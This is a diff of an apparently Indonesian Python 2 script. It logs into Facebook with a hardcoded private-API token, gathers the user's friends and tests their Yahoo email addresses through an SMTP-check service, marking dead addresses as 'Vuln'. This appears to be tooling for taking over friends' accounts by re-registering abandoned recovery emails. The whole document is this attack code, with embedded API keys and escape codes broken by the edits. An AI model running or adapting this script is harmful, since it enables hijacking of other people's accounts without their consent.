@@ -1,27 +1,24 @@
-
-
 import requests, json, os, re, sys, mechanize, urllib
 reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 os.system("clear")
-print ("\033[39m[\033[31m+\033[39m] \033[31mAuthor  : BagasZChannel")
-idt = raw_input("\033[39m[\033[31m*\033[39m] Email   : ")
-passw = raw_input("\033[39m[\033[31m*\033[39m] Password: ")
-url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
+id = raw_input("\030[30m[\030[30m*\030[30m] Username : ")
+passw = raw_input("\030[30m[\030[30m*\030[30m] Password : ")
+url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (id) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
 data = urllib.urlopen(url)
 op = json.load(data)
 if 'access_token' in op:
     token = (op["access_token"])
-    print ("\033[39m[\033[31m+\033[39m] Login Berhasil")
+    print ("\040[40m[\030[31m+\030[31m] Login Sukses")
 else:
-    print ("\033[39m[\033[31m+\033[39m] \033[31mLogin Gagal!")
+    print ("\040[40m[\030[31m+\030[31m] \033[31mLogin Gagal!!:v")
     sys.exit()
 get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
 hasil = json.loads(get_friends.text)
-print ("\033[39m[\033[31m+\033[39m] Berhasil Mendapatkan ID Teman...")
-#cok = open('Mail_Yahoo.txt','w')
+print ("\033[39m[\033[31m+\033[39m] Mengumpulkan Yahoo Teman..")
+#gan = open('Mail_Yahoo.txt','w')
 def defense():
     global o, h
     o = []
@@ -50,10 +47,10 @@ def defense():
                     cd = Zen.search(j).group()
                 except:
                     vuln = 6*" " + "\033[31mNot Vuln"
-                    
+                    #Email Len
                     lean = 30 - (len(z['email']))
                     eml = lean * " "
-                    
+                    #Name Len
                     lone = 24 - (len(vuln))
                     namel = lone * " "
                     print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
@@ -62,11 +59,9 @@ def defense():
                     vuln = 8*" " + "\033[32mVuln"
                 else:
                     vuln = 5*" " + "\033[31mNot Vuln"
-                
+                #Email Len
                 lean = 30 - (len(z['email']))
-                eml = lean * " "
-                
-               
+                eml = lean * " "                              
                 lone = 24 - (len(vuln))
                 namel = lone * " "
                 print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
@@ -74,14 +69,12 @@ def defense():
                 url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
                 cek = json.loads(requests.get(url).text)
                 if cek['smtp_check'] == 0:
-                    vuln = 8*" " + "\033[32mVuln"
+                    vuln = 8*" " + "\030[37mVuln"
 
                 else:
-                    vuln = 5*" " + "\033[31mNot Vuln"
+                    vuln = 5*" " + "\030[37mTidak Vuln"
                 lean = 30 - (len(z['email']))
-                eml = lean * " "
-                
-                
+                eml = lean * " "                             
                 lone = 24 - (len(vuln))
                 namel = lone * " "
                 print "\033[36m| " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
